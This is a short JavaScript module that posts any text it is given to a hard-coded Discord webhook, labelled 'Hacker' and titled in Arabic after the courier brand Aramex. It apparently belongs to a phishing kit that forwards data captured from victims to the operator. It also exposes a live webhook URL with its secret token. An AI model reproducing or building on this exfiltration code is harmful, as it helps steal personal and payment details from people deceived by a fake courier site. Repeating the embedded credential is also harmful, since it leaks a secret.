import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1326187025279357059/xYr4wi-_jUIdJBtCZPEzLgT8hpHaXRjey1IJS6_vXHnCNrbnvNXlrbI_XlXE2mVOwcL-",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
